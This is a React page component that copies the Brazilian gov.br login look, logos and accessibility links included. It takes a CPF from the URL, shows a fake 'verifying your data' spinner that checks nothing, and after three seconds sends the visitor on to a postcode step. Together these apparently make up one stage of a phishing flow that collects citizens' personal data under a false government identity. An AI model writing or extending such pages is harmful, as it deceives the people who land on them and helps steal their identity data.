import { useEffect, useState } from "react";
import { useLocation } from "wouter";

export default function LoadingValidacao() {
  const [, setLocation] = useLocation();
  const [cpf, setCpf] = useState("");

  useEffect(() => {
    // Capturar CPF da URL
    const params = new URLSearchParams(window.location.search);
    const cpfParam = params.get("cpf");
    if (cpfParam) {
      setCpf(cpfParam);
    }

    // Após 3 segundos, redireciona para a página de validação com step de CEP
    const timer = setTimeout(() => {
      setLocation(`/validacao-cep?cpf=${cpfParam || ""}`);
    }, 3000);

    return () => clearTimeout(timer);
  }, [setLocation]);

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            <div style={{ textAlign: "center", padding: "40px 20px" }}>
              <h3>Verificando seus dados...</h3>
              <p style={{ marginBottom: "30px", color: "#666" }}>
                Aguarde enquanto analisamos as informações fornecidas.
              </p>

              {/* Animação de loading */}
              <div
                style={{
                  display: "flex",
                  justifyContent: "center",
                  alignItems: "center",
                  marginBottom: "20px",
                }}
              >
                <div
                  style={{
                    width: "60px",
                    height: "60px",
                    border: "6px solid #f3f3f3",
                    borderTop: "6px solid #008C32",
                    borderRadius: "50%",
                    animation: "spin 1s linear infinite",
                  }}
                ></div>
              </div>

              <p style={{ fontSize: "14px", color: "#666" }}>
                Verificando correspondência de dados...
              </p>

              <style>
                {`
                  @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                  }
                `}
              </style>
            </div>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
